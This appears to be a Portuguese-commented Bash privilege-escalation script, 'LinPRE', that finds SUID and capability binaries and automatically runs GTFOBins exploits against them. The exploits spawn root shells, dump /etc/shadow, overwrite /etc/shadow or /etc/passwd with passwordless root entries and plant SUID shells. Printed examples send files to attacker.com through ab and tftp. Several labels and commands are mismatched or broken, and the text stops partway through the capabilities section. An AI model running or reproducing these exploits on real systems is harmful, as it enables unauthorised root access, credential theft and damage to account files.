#!/bin/bash

echo -e "\e[1;35m"
cat << "EOF"
 _     _       ____  ____  _____ 
| |   (_)_ __ |  _ \|  _ \| ____|
| |   | | '_ \| |_) | |_) |  _|  
| |___| | | | |  _ <|  __/| |___ 
|_____|_|_| |_|_| \_\_|   |_____|
         
EOF
echo -e "\e[0m"

echo -e "\e[1;35m"
echo "[*] ----------------- SUID ----------------"
echo "[*] Procurando binários SUID do GTFOBins..."
echo "[*] ---------------------------------------"
echo -e "\e[0m"

SUIDS=$(find / -perm -u=s -type f 2>/dev/null)
echo "$SUIDS"
for path in $SUIDS; do
    bin=$(basename "$path")

    case "$bin" in
        bash)
            echo "[+] $path → BASH SUID encontrado! Teste:"
            "$path" -p
            ;;
        aa-exec)
            echo "[+] $path → aa-exec SUID encontrado!"
            "$path" /bin/sh -p
            ;;
        ab)
            echo "[+] $path → ab SUID encontrado! Teste:"
            echo "URL=http://attacker.com/"
            echo "LFILE=file_to_send"
            echo "ab -p $LFILE $URL"
            ;;
        agetty)
            echo "[+] $path → agetty SUID encontrado! Teste:"
            "$path" -o -p -l /bin/sh -a root tty
            ;;
        alpine)
            echo "[+] $path → alpine SUID encontrado! Teste:"
            "$path" -F /etc/shadow
            ;;
        ar)
            echo "[+] $path → ar SUID encontrado! Teste:"
            TF=$(mktemp -u)
            "$path" r "$TF" /etc/shadow
            cat "$TF"
            rm -f "$TF" 2>/dev/null
            ;;
        arj)
            echo "[+] $path → arj SUID encontrado! Teste:"
            TF=$(mktemp -d)
            echo 'zero::666:0:99999:7:::' > "$TF/shadow"
            echo 'zero:x:1337:0::/root:/bin/bash' > "$TF/passwd"

            "$path" a "$TF/a" "$TF/shadow"
            "$path" a "$TF/a" "$TF/passwd"
            "$path" e "$TF/a" /etc

            sleep 1
            echo "[*] Tentando acessar com su zero:"
            su zero
            id       
            ;;
        arp)
            echo "[+] $path → arp SUID encontrado! Teste:"
            "$path" -v -f /etc/shadow
            ;;
        as)
            echo "[+] $path → as SUID encontrado! Teste:"
            LFILE=/etc/shadow
            "$path" @$LFILE
            ;;
        ascii-xfr)
            echo "[+] $path → ascii-xfr SUID encontrado! Teste:"
            "$path" -ns /etc/shadow
            ;;
        ash)
            echo "[+] $path → ash SUID encontrado! Teste:"
            "$path" 
            ;;
        aspell)
            echo "[+] $path → aspell SUID encontrado! Teste:"
            "$path" -c /etc/shadow
            ;;
        atobm)
            echo "[+] $path → atobm SUID encontrado! Teste:"
            "$path" /etc/shadow 2>&1 | awk -F "'" '{printf "%s", $2}'
            ;;
        awk)
            echo "[+] $path → awk SUID encontrado! Teste:"
            "$path" '//' /etc/shadow
            "$path" 'BEGIN {system("/bin/sh")}'
            id
            ;;
        base32)
            echo "[+] $path → base32 SUID encontrado! Teste:"
            "$path" /etc/shadow | "$path" --decode
            ;;
        base64)
            echo "[+] $path → base64 SUID encontrado! Teste:"
            "$path" /etc/shadow | "$path" --decode
            ;;
        basenc)
            echo "[+] $path → basenc SUID encontrado! Teste:"
            "$path" --base64 /etc/shadow | "$path" -d --base64
            ;;
        basez)
            echo "[+] $path → basez SUID encontrado! Teste:"
            "$path" /etc/shadow | "$path" --decode
            ;;
        bc)
            echo "[+] $path → bc SUID encontrado! Teste:"
            "$path" -s /etc/shadow
            quit
            ;;
        bridge)
            echo "[+] $path → bridge SUID encontrado! Teste:"
            "$path" -b /etc/shadow
            ;;
        busctl)
            echo "[+] $path → busctl SUID encontrado! Teste:"
            "$path" set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
            ;;
        busybox)
            echo "[+] $path → busybox SUID encontrado! Teste:"
            "$path" sh
            ;;
        bzip2)
            echo "[+] $path → bzip2 SUID encontrado! Teste:"
            "$path" -c /etc/shadow | "$path" -d
            ;;
        cabal)
            echo "[+] $path → cabal SUID encontrado! Teste:"
            "$path" exec -- /bin/sh -p
            ;;
        capsh)
            echo "[+] $path → capsh SUID encontrado! Teste:"
            "$path" --gid=0 --uid=0 --
            ;;
        cat)
            echo "[+] $path → cat SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        chmod)
            echo "[+] $path → chmod SUID encontrado! Teste:"
            "$path" chmod /etc/shadow
            ;;
        chown)
            echo "[+] $path → chown SUID encontrado! Teste:"
            cp /bin/bash /tmp/sh
            "$path" root:root /tmp/sh
            chmod +s /tmp/sh
            /tmp/sh -p
            ;;
        choom)
            echo "[+] $path → choom SUID encontrado! Teste:"
            "$path" -n 0 -- /bin/sh -p
            ;;
        chroot)
            echo "[+] $path → chroot SUID encontrado! Teste:"
            "$path" / /bin/sh -p
            ;;
        clamscan)
            echo "[+] $path → clamscan SUID encontrado! Teste:"
            LFILE=/etc/shadow
            TF=$(mktemp -d)
            touch $TF/empty.yara
            "$path" --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
            ;;
        cmp)
            echo "[+] $path → cmp SUID encontrado! Teste:"
            "$path" /etc/shadow /dev/zero -b -l
            ;;
        column)
            echo "[+] $path → column SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        comm)
            echo "[+] $path → comm SUID encontrado! Teste:"
            "$path" /etc/shadow /dev/null 2>/dev/null
            ;;
        cp)
            echo "[+] $path → cp SUID encontrado! Teste:"
            echo "gtfobins.github.io/gtfobins/cp/"
            ;;
        cpio)
            echo "[+] $path → cpio SUID encontrado! Teste:"
            LFILE=/etc/shadow
            TF=$(mktemp -d)
            echo "$LFILE" | "$path" -R $UID -dp $TF
            cat "$TF/$LFILE"
            ;;
        cpulimit)
            echo "[+] $path → cpulimit SUID encontrado! Teste:"
            "$path" -l 100 -f -- /bin/sh -p
            ;;
        csh)
            echo "[+] $path → csh SUID encontrado! Teste:"
            "$path" -b
            ;;
        csplit)
            echo "[+] $path → csplit SUID encontrado! Teste:"
            "$path" /etc/shadow 1
            cat xx01
            ;;
        csvtool)
            echo "[+] $path → csvtool SUID encontrado! Teste:"
            "$path" trim t /etc/shadow
            ;;
        cupsfilter)
            echo "[+] $path → cupsfilter SUID encontrado! Teste:"
            "$path" -i application/octet-stream -m application/octet-stream /etc/shadow
            ;;
        curl)
            echo "[+] $path → curl SUID encontrado! Teste:"
            echo "URL=http://attacker.com/file_to_get"
            echo "LFILE=file_to_save"
            echo "./curl $URL -o $LFILE"
            ;;
        cut)
            echo "[+] $path → cut SUID encontrado! Teste:"
            "$path" -d "" -f1 /etc/shadow
            ;;
        dash)
            echo "[+] $path → dash SUID encontrado! Teste:"
            "$path" -p
            ;;
        date)
            echo "[+] $path → date SUID encontrado! Teste:"
            "$path" -f /etc/shadow
            ;;
        dd)
            echo "[+] $path → dd SUID encontrado! Teste:"
            echo "data" | "$path" of=/etc/shadow
            ;;
        debugfs)
            echo "[+] $path → debugfs SUID encontrado! Teste:"
            "$path"
            !/bin/sh
            ;;        
        dialog)
            echo "[+] $path → dialog SUID encontrado! Teste:"
            "$path" --textbox /etc/shadow 0 0
            ;;
        diff)
            echo "[+] $path → diff SUID encontrado! Teste:"
            "$path" --line-format=%L /dev/null /etc/shadow
            ;;
        dig)
            echo "[+] $path → dig SUID encontrado! Teste:"
            "$path" -f /etc/shadow
            ;;
        distcc)
            echo "[+] $path → distcc SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        dmsetup)
            echo "[+] $path → dmsetup SUID encontrado! Teste:"
            echo "dmsetup create base <<EOF"
            echo "0 3534848 linear /dev/loop0 94208"
            echo "EOF"
            echo "dmsetup ls --exec '/bin/sh -p -s'"
            ;;
        docker)
            echo "[+] $path → docker SUID encontrado! Teste:"
            "$path" run -v /:/mnt --rm -it alpine chroot /mnt sh
            ;;        
        dosbox)
            echo "[+] $path → dosbox SUID encontrado! Teste:"
            echo "LFILE='\path\to\file_to_write'"
            echo "dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit"
            ;;
        ed)
            echo "[+] $path → ed SUID encontrado! Teste:"
            "$path" /etc/shadow
            ,p
            q 
            ;;
        efax)
            echo "[+] $path → efax SUID encontrado! Teste:"
            "$path" -d /etc/shadow
            ;;
        elvish)
            echo "[+] $path → elvish SUID encontrado! Teste:"
            "$path"
            ;;
        emacs)
            echo "[+] $path → emacs SUID encontrado! Teste:"
            "$path" -Q -nw --eval '(term "/bin/sh -p")'
            ;;
        env)
            echo "[+] $path → env SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        eqn)
            echo "[+] $path → eqn SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;        
        espeak)
            echo "[+] $path → espeak SUID encontrado! Teste:"
            "$path" -qXf /etc/shadow
            ;;
        expand)
            echo "[+] $path → expand SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        expect)
            echo "[+] $path → expect SUID encontrado! Teste:"
            "$path" -c 'spawn /bin/sh -p;interact'
            ;;
        file)
            echo "[+] $path → file SUID encontrado! Teste:"
            "$path" -f /etc/shadow
            ;;
        find)
            echo "[+] $path → find SUID encontrado! Teste:"
            "$path" . -exec /bin/sh -p \; -quit
            ;;
        fish)
            echo "[+] $path → fish SUID encontrado! Teste:"
            "$path"
            ;;
        flock)
            echo "[+] $path → flock SUID encontrado! Teste:"
            "$path" -u / /bin/sh -p
            ;;        
        fmt)
            echo "[+] $path → fmt SUID encontrado! Teste:"
            "$path" -999 /etc/shadow
            ;;
        fold)
            echo "[+] $path → fold SUID encontrado! Teste:"
            "$path" -w99999999 /etc/shadow
            ;;
        gawk)
            echo "[+] $path → gawk SUID encontrado! Teste:"
            "$path" '//' "/etc/shadow"
            ;;
        gcore)
            echo "[+] $path → gcore SUID encontrado! Teste:"
            echo "Busque um processo rodando como root para usar"
            echo ""$path" $PID"
            ;;
        gdb)
            echo "[+] $path → gdb SUID encontrado! Teste:"
            "$path" -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
            ;;
        genie)
            echo "[+] $path → genie SUID encontrado! Teste:"
            "$path" -c '/bin/sh'
            ;;
        genisoimage)
            echo "[+] $path → genisoimage SUID encontrado! Teste:"
            "$path" -sort /etc/shadow
            ;;        
        gimp)
            echo "[+] $path → gimp SUID encontrado! Teste:"
            "$path" -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
            ;;
        grep)
            echo "[+] $path → grep SUID encontrado! Teste:"
            "$path" '' /etc/shadow
            ;;
        gtester)
            echo "[+] $path → gtester SUID encontrado! Teste:"
            TF=$(mktemp)
            echo '#!/bin/sh -p' > $TF
            echo 'exec /bin/sh -p 0<&1' >> $TF
            chmod +x $TF
            sudo "$path" -q $TF
            ;;
        gzip)
            echo "[+] $path → gzip SUID encontrado! Teste:"
            "$path" -f /etc/shadow -t
            ;;
        hd)
            echo "[+] $path → hd SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        head)
            echo "[+] $path → head SUID encontrado! Teste:"
            "$path" -c1G /etc/shadow
            ;;
        hexdump)
            echo "[+] $path → hexdump SUID encontrado! Teste:"
            "$path" -C /etc/shadow
            ;;        
        highlight)
            echo "[+] $path → highlight SUID encontrado! Teste:"
            "$path" --no-doc --failsafe /etc/shadow
            ;;
        hping3)
            echo "[+] $path → hping3 SUID encontrado! Teste:"
            "$path"
            /bin/sh -p
            ;;
        iconv)
            echo "[+] $path → iconv SUID encontrado! Teste:"
            "$path" -f 8859_1 -t 8859_1 /etc/shadow
            ;;
        install)
            echo "[+] $path → install SUID encontrado! Teste:"
            "$path" -o root -g root -m 6777 /bin/bash ./suidbash
            ./suidbash -p
            ;;
        ionice)
            echo "[+] $path → ionice SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        ip)
            echo "[+] $path → ip SUID encontrado! Teste:"
            "$path" -force -batch /etc/shadow
            ;;
        ispell)
            echo "[+] $path → ispell SUID encontrado! Teste:"
            "$path" /etc/passwd
            !/bin/sh -p
            ;;        
        jjs)
            echo "[+] $path → jjs SUID encontrado! Teste:"
            echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | "$path"
            ;;
        join)
            echo "[+] $path → join SUID encontrado! Teste:"
            "$path" -a 2 /dev/null /etc/shadow
            ;;
        jq)
            echo "[+] $path → jq SUID encontrado! Teste:"
            "$path" -Rr . /etc/shadow
            ;;
        jrunscript)
            echo "[+] $path → jrunscript SUID encontrado! Teste:"
            "$path" -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
            ;;
        julia)
            echo "[+] $path → julia SUID encontrado! Teste:"
            "$path" -e 'run(`/bin/sh -p`)'
            ;;
        ksh)
            echo "[+] $path → ksh SUID encontrado! Teste:"
            "$path" -p
            ;;
        ksshell)
            echo "[+] $path → ksshell SUID encontrado! Teste:"
            "$path" -i /etc/shadow
            ;;
        kubectl)
            echo "[+] $path → kubectl SUID encontrado! Teste:"
            echo "LFILE=/etc"
            echo "./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
            echo "Acesse o arquivo com curl http://127.0.0.1:444/x/shadow"            
            ;;
        ld.so)
            echo "[+] $path → ld.so SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        less)
            echo "[+] $path → less SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        links)
            echo "[+] $path → links SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        logsave)
            echo "[+] $path → logsave SUID encontrado! Teste:"
            "$path" /dev/null /bin/sh -i -p
            ;;
        look)
            echo "[+] $path → look SUID encontrado! Teste:"
            "$path" '' /etc/shadow
            ;;
        lua)
            echo "[+] $path → lua SUID encontrado! Teste:"
            "$path" -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
            ;;
        make)
            echo "[+] $path → BASH SUID encontrado! Teste:"
            cmd='/bin/sh -p'
            "$path" -s --eval=$'x:\n\t-'"$cmd"
            ;;
        mawk)
            echo "[+] $path → mawk SUID encontrado! Teste:"
            "$path" '//' /etc/shadow
            ;;
        minicom)
            echo "[+] $path → minicom SUID encontrado! Teste:"
            "$path" -D /dev/null
            ;;
        more)
            echo "[+] $path → more SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        mosquitto)
            echo "[+] $path → mosquitto SUID encontrado! Teste:"
            "$path" -c /etc/shadow
            ;;
        msgattrib)
            echo "[+] $path → msgattrib SUID encontrado! Teste:"
            "$path" -P /etc/shadow
            ;;
        msgcat)
            echo "[+] $path → msgcat SUID encontrado! Teste:"
            "$path" -P /etc/shadow
            ;;
        msgconv)
            echo "[+] $path → msgconv SUID encontrado! Teste:"
            "$path" -P /etc/shadow
            ;;
        msgfilter)
            echo "[+] $path → msgfilter SUID encontrado! Teste:"
            echo x | "$path" -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
            ;;
        msgmerge)
            echo "[+] $path → msgmerge SUID encontrado! Teste:"
            "$path" -P /etc/shadow /dev/null
            ;;
        msguniq)
            echo "[+] $path → msguniq SUID encontrado! Teste:"
            "$path" -P /etc/shadow
            ;;
        multitime)
            echo "[+] $path → multitime SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        mv)
            echo "[+] $path → mv SUID encontrado! Teste zerar a senha do root:"
            echo "LFILE=/etc/shadow"
            echo "TF=$(mktemp)"
            echo "echo "root::0:0:root:/root:/bin/bash" > $TF"
            echo ""$path" $TF $LFILE"
            ;;
        nasm)
            echo "[+] $path → nasm SUID encontrado! Teste:"
            "$path" -@ /etc/shadow
            ;;
        nawk)
            echo "[+] $path → nawk SUID encontrado! Teste:"
            "$path" '//' /etc/shadow
            ;;
        ncftp)
            echo "[+] $path → ncftp SUID encontrado! Teste:"
            "$path"
            !/bin/sh -p
            ;;
        nft)
            echo "[+] $path → nft SUID encontrado! Teste:"
            "$path" -f /etc/shadow
            ;;
        nice)
            echo "[+] $path → nice SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        nl)
            echo "[+] $path → nl SUID encontrado! Teste:"
            "$path" -bn -w1 -s '' /etc/shadow
            ;;
        nm)
            echo "[+] $path → nm SUID encontrado! Teste:"
            LFILE=/etc/shadow
            "$path" @$LFILE
            ;;
        nmap)
            echo "[+] $path → nmap SUID encontrado! Teste:"
            "$path" --version
            echo "[+] Versão < 5.21 tem --interactive  !sh"
            echo "ou"
            echo "LFILE=file_to_write"
            echo "./nmap -oG=$LFILE DATA"
            ;;
        node)
            echo "[+] $path → node SUID encontrado! Teste:"
            "$path" -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
            ;;
        nohup)
            echo "[+] $path → nohup SUID encontrado! Teste:"
            "$path" /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
            ;;
        ntpdate)
            echo "[+] $path → ntpdate SUID encontrado! Teste:"
            "$path" -a x -k /etc/shadow -d localhost
            ;;
        od)
            echo "[+] $path → od SUID encontrado! Teste:"
            "$path" -An -c -w9999 /etc/shadow
            ;;
        openssl)
            echo "[+] $path → openssl SUID encontrado! Teste:"
            echo "[+] Tem a opção de shell"
            echo "[+] OU"
            echo "[+] LFILE=file_to_write"
            echo "[+] echo DATA | openssl enc -out "$LFILE""
            ;;
        openvpn)
            echo "[+] $path → openvpn SUID encontrado! Teste:"
            "$path" --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
            ;;
        pandoc)
            echo "[+] $path → pandoc SUID encontrado! Teste:"
            echo "[+] LFILE=file_to_write"
            echo "[+] echo DATA | ./pandoc -t plain -o "$LFILE""
            ;;
        paste)
            echo "[+] $path → paste SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        perf)
            echo "[+] $path → perf SUID encontrado! Teste:"
            "$path" stat /bin/sh -p
            ;;
        perl)
            echo "[+] $path → perl SUID encontrado! Teste:"
            "$path" -e 'exec "/bin/sh";'
            ;;
        pexec)
            echo "[+] $path → pexec SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        pg)
            echo "[+] $path → pg SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        php)
            echo "[+] $path → php SUID encontrado! Teste:"
            CMD="/bin/sh"
            "$path" -r "pcntl_exec('/bin/sh', ['-p']);"
            ;;
        pidstat)
            echo "[+] $path → pidstat SUID encontrado! Teste:"
            cmd=id
            "$path" -e $cmd
            ;;
        pr)
            echo "[+] $path → pr SUID encontrado! Teste:"
            "$path" -T /etc/shadow
            ;;
        ptx)
            echo "[+] $path → ptx SUID encontrado! Teste:"
            "$path" -w 5000 /etc/shadow
            ;;
        python | python3)
            echo "[+] $path → python SUID encontrado! Teste:"
            "$path" -c 'import os; os.execl("/bin/sh", "sh", "-p")'
            ;;
        rc)
            echo "[+] $path → rc SUID encontrado! Teste:"
            "$path" -c '/bin/sh -p'
            ;;
        readelf)
            echo "[+] $path → readelf SUID encontrado! Teste:"
            LFILE=/etc/shadow
            "$path" -a @$LFILE
            ;;
        restic)
            echo "[+] $path → restic SUID encontrado! Teste:"
            echo "RHOST=yourIP"
            echo "RPORT=12345"
            echo "LFILE=file_or_dir_to_get"
            echo "NAME=backup_name"
            echo "restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE""
            ;;
        rev)
            echo "[+] $path → rev SUID encontrado! Teste:"
            "$path" /etc/shadow | rev
            ;;
        rlwrap)
            echo "[+] $path → rlwrap SUID encontrado! Teste:"
            "$path" -H /dev/null /bin/sh -p
            ;;
        rsync)
            echo "[+] $path → rsync SUID encontrado! Teste:"
            "$path" -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
            ;;
        rtorrent)
            echo "[+] $path → BASH SUID encontrado! Teste:"
            echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~"$path"
            "$path"
            ;;
        run-parts)
            echo "[+] $path → run-parts SUID encontrado! Teste:"
            "$path" --new-session --regex '^sh$' /bin --arg='-p'
            ;;
        rview)
            echo "[+] $path → rview SUID encontrado! Teste:"
            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
            ;;
        rvim)
            echo "[+] $path → rvim SUID encontrado! Teste:"
            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
            ;;
        sash)
            echo "[+] $path → sash SUID encontrado! Teste:"
            "$path"
            ;;
        scanmem)
            echo "[+] $path → scanmem SUID encontrado! Teste:"
            "$path"
            shell /bin/sh
            ;;
        sed)
            echo "[+] $path → sed SUID encontrado! Teste:"
            LFILE=/etc/shadow
            "$path" -e '' "$LFILE"
            ;;
        setarch)
            echo "[+] $path → setarch SUID encontrado! Teste:"
            "$path" $(arch) /bin/sh -p
            ;;
        setfacl)
            echo "[+] $path → setfacl SUID encontrado! Teste:"
            "$path" -m u:$(whoami):rwx /etc/shadow
            ;;
        setlock)
            echo "[+] $path → setlock SUID encontrado! Teste:"
            "$path" - /bin/sh -p
            ;;
        shuf)
            echo "[+] $path → shuf SUID encontrado! Teste:"
            echo "LFILE=file_to_write"
            echo "shuf -e DATA -o "$LFILE""
            ;;
        soelim)
            echo "[+] $path → soelim SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        softlimit)
            echo "[+] $path → softlimit SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        sort)
            echo "[+] $path → sort SUID encontrado! Teste:"
            "$path" -m /etc/shadow
            ;;
        sqlite3)
            echo "[+] $path → sqlite3 SUID encontrado! Teste:"
            LFILE=/etc/shadow
            "$path" << EOF
            CREATE TABLE t(line TEXT);
            .import $LFILE t
            SELECT * FROM t;
EOF
            ;;
        ss)
            echo "[+] $path → ss SUID encontrado! Teste:"
            "$path" -a -F /etc/shadow
            ;;
        ssh-agent)
            echo "[+] $path → ssh-agent SUID encontrado! Teste:"
            "$path" /bin/ -p
            ;;
        ssh-keygen)
            echo "[+] $path → ssh-keygen SUID encontrado! Teste:"
            "$path" -D ./lib.so
            ;;
        ssh-keyscan)
            echo "[+] $path → ssh-keyscan SUID encontrado! Teste:"
            "$path" -f /etc/shadow
            ;;
        sshpassb)
            echo "[+] $path → sshpass SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        start-stop-daemon)
            echo "[+] $path → start-stop-daemon SUID encontrado! Teste:"
            "$path" -n $RANDOM -S -x /bin/sh -- -p
            ;;
        stdbuf)
            echo "[+] $path → stdbuf SUID encontrado! Teste:"
            "$path" -i0 /bin/sh -p
            ;;
        strace)
            echo "[+] $path → strace SUID encontrado! Teste:"
            "$path" -o /dev/null /bin/sh -p
            ;;
        strings)
            echo "[+] $path → strings SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        sysctl)
            echo "[+] $path → sysctl SUID encontrado! Teste:"
            cmd='/bin/sh -c id>/tmp/id'
            ./sysctl "kernel.core_pattern=|$cmd"
            sleep 9999 &
            kill -QUIT $!
            cat /tmp/id
            ;;
        systemctl)
            echo "[+] $path → systemctl SUID encontrado! Teste:"
            TF=$(mktemp).service
            echo '[Service]
            Type=oneshot
            ExecStart=/bin/sh -c "id > /tmp/output"
            [Install]
            WantedBy=multi-user.target' > $TF
            "$path" link $TF
            "$path" enable --now $TF
            cat /tmp/output
            ;;
        tac)
            echo "[+] $path → tac SUID encontrado! Teste:"
            "$path" -s 'RANDOM' /etc/shadow
            ;;
        tail)
            echo "[+] $path → tail SUID encontrado! Teste:"
            "$path" -c1G /etc/shadow
            ;;
        taskset)
            echo "[+] $path → taskset SUID encontrado! Teste:"
            "$path" 1 /bin/sh -p
            ;;
        tbl)
            echo "[+] $path → tbl SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        tclsh)
            echo "[+] $path → tclsh SUID encontrado! Teste:"
            "$path"
            exec /bin/sh -p <@stdin >@stdout 2>@stderr
            ;;
        tee)
            echo "[+] $path → tee SUID encontrado! Teste:"
            echo "LFILE=file_to_write"
            echo "echo DATA | ./tee -a "$LFILE""
            ;;
        terraform)
            echo "[+] $path → terraform SUID encontrado! Teste:"
            echo "terraform console"
            echo "file("/etc/shadow")"
            ;;
        tftp)
            echo "[+] $path → tftp SUID encontrado! Teste:"
            echo "RHOST=attacker.com"
            echo "./tftp $RHOST"
            echo "put file_to_send"
            ;;
        tic)
            echo "[+] $path → tic SUID encontrado! Teste:"
            "$path" -C /etc/shadow
            ;;
        time)
            echo "[+] $path → time SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        timeout)
            echo "[+] $path → timeout SUID encontrado! Teste:"
            "$path" 7d /bin/sh -p
            ;;
        troff)
            echo "[+] $path → troff SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        ul)
            echo "[+] $path → ul SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        unexpand)
            echo "[+] $path → unexpand SUID encontrado! Teste:"
            "$path" -t99999999 /etc/shadow
            ;;
        uniq)
            echo "[+] $path → uniq SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        unshare)
            echo "[+] $path → unshare SUID encontrado! Teste:"
            "$path" -r /bin/sh
            ;;
        unsquashfs)
            echo "[+] $path → unsquashfs SUID encontrado! Teste:"
            "$path" shell
            squashfs-root/sh -p
            ;;
        unzip)
            echo "[+] $path → unzip SUID encontrado! Teste:"
            echo "./unzip -K shell.zip"
            echo "./sh -p"
            ;;
        update-alternatives)
            echo "[+] $path → update-alternatives SUID encontrado! Teste:"
            echo "LFILE=/path/to/file_to_write"
            echo "TF=$(mktemp)"
            echo "echo DATA >$TF"
            echo "update-alternatives --force --install "$LFILE" x "$TF" 0"
            ;;
        uudecode)
            echo "[+] $path → uudecode SUID encontrado! Teste:"
            "$path" /etc/shadow /dev/stdout | "$path"
            ;;
        uuencode)
            echo "[+] $path → uuencode SUID encontrado! Teste:"
            "$path" /etc/shadow /dev/stdout | "$path"
            ;;
        vagrant)
            echo "[+] $path → vagrant SUID encontrado! Teste:"
            cd $(mktemp -d)
            echo 'exec "/bin/sh -p"' > Vagrantfile
            "$path" up
            ;;
        varnishncsa)
            echo "[+] $path → varnishncsa SUID encontrado! Teste:"
            cp /etc/passwd /tmp/passwd_bk
            echo "Realizado backup de passwd em tmp"
            LFILE=/etc/passwd
            "$path" -g request -q 'ReqURL ~ "/xxx"' -F 'root::0:0:root:/root:/bin/bash' -w "$LFILE"
            su root
            ;;
        view)
            echo "[+] $path → view SUID encontrado! Teste:"
            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
            ;;
        vigr)
            echo "[+] $path → vigr SUID encontrado! Teste:"
            "$path"
            ;;
        vim)
            echo "[+] $path → vim SUID encontrado! Teste:"
            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
            ;;
        vimdiff)
            echo "[+] $path → vimdiff SUID encontrado! Teste:"
            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
            ;;
        vipw)
            echo "[+] $path → vipw SUID encontrado! Teste:"
            "$path"
            ;;
        w3m)
            echo "[+] $path → w3m SUID encontrado! Teste:"
            "$path" /etc/shadow -dump
            ;;
        watch)
            echo "[+] $path → watch SUID encontrado! Teste:"
            "$path" -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
            ;;
        wc)
            echo "[+] $path → wc SUID encontrado! Teste:"
            "$path" --files0-from /etc/shadow
            ;;
        wget)
            echo "[+] $path → wget SUID encontrado! Teste:"
            TF=$(mktemp)
            chmod +x $TF
            echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
            "$path" --use-askpass=$TF 0
            ;;
        whiptail)
            echo "[+] $path → whiptail SUID encontrado! Teste:"
            "$path" --textbox --scrolltext /etc/shadow 0 0
            ;;
        xargs)
            echo "[+] $path → xargs SUID encontrado! Teste:"
            "$path" -a /dev/null sh -p
            ;;
        xdotool)
            echo "[+] $path → xdotool SUID encontrado! Teste:"
            "$path" exec --sync /bin/sh -p
            ;;
        xmodmap)
            echo "[+] $path → xmodmap SUID encontrado! Teste:"
            "$path" -v /etc/shadow
            ;;
        xmore)
            echo "[+] $path → xmore SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        xxd)
            echo "[+] $path → xxd SUID encontrado! Teste:"
            "$path" /etc/shadow | "$path" -r
            ;;
        xz)
            echo "[+] $path → xz SUID encontrado! Teste:"
            "$path" -c /etc/shadow | "$path" -d
            ;;
        yash)
            echo "[+] $path → yash SUID encontrado! Teste:"
            "$path"
            ;;
        zsh)
            echo "[+] $path → zsh SUID encontrado! Teste:"
            "$path"
            ;;
        zsoelim)
            echo "[+] $path → zsoelim SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;

        *)
            ;;
    esac
done

echo -e "\e[1;35m"
echo "[*] ------------- Capabilities ------------"
echo "[*] Procurando binários com capabilities..."
echo "[*] ---------------------------------------"
echo -e "\e[0m"

cmd=$(getcap -r / 2>/dev/null)
echo "$cmd"
echo "$cmd" | while read -r l; do
    pathc=$(echo "$l" | cut -d' ' -f1)

    cap=$(basename "$pathc")

    case "$cap" in
        gdb)
            echo "[+] $pathc → perl com capabilities! Executando:"
            "$pathc" -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
            ;;
        node)
            echo "[+] $pathc → python com capabilities! Executando:"
            "$pathc" -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
            ;;
        perl)
            echo "[+] $pathc → ping com capabilities! (pouco útil)"
            "$pathc" -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
